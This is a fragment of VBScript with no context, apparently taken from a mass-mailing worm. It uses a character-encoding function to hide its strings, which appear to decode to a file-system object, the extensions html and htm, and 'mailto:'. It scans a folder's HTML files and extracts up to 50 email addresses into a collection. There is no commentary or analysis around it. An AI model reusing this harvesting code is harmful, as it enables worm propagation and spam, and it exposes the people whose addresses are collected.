Set f=CreateObject(q("Tdunwsni`)AnkbT~tsbjHembds"))
If Dc.Count < 50 Then
Set A = f.GetFolder(fl)
Set XA = A.Files
For Each Y In XA
ext = LCase(f.GetExtensionName(Y.Path))
If (ext = q("osjk")) Or (ext = q("osj")) Then
Set Xf = f.OpenTextFile(Y.Path)
Do While Xf.AtendOfStream = False
Xl = Xf.ReadLine
n = InStr(LCase(Xl), q("jfnksh="))
If n <> 0 Then
Xl = Left(Right(Xl, (Len(Xl) - (n + 6))), _
InStr(Right(Xl, (Len(Xl) - (n + 6))), Chr(34))-1)
If IsMail(Xl) Then
i = Dc.Count + 1
Dc.Add i, Xl
End If
End If
Loop
Xf.Close
End If
Next
End If
Set f = Nothing
End Sub
